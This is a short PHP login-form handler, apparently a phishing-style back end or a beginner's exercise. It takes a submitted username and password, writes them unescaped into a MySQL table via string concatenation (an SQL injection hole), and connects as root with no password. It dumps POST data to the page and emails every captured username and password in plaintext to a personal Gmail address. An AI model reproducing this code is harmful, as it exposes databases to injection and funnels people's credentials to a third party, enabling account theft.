<?php
ini_set('display_errors', 1);
error_reporting(E_ALL);
echo '<pre>';
var_dump( $_POST );

$loginUser  = '';
$loginPassword   = '';

if ( !empty ( $_POST ) ) {
    if  ( !empty ( $_POST['loginUser'] ) &&
        is_string( $_POST['loginUser'] ) ) {
            $loginUser = $_POST['loginUser'];
    }
    if ( !empty ( $_POST['loginPassword'] ) &&
        is_string( $_POST['loginPassword'] ) ) {
            $loginPassword = $_POST['loginPassword'];
    }
}

$connectionmysql = new mysqli( 'localhost', 'root', '', 'index' );

echo '<pre>';
if ( $connectionmysql->connect_error ) {
    die( 'No pudiste conectarte con el servidor.' );
}

if ( $loginUser !== '' && $loginPassword !== '') {

            $insert = $connectionmysql->query( 'INSERT INTO mensajes(luser, lpassword) VALUES
            ("' . $loginUser . '", "' . $loginPassword . '")');
            
            mail ( 'curzi.angela@gmail.com', 'Nuevo usuario', 'Nuevo password' . $loginUser . $loginPassword);

} else {
    echo 'ERRRRRRRRRRRRRRRRROR';
}

?>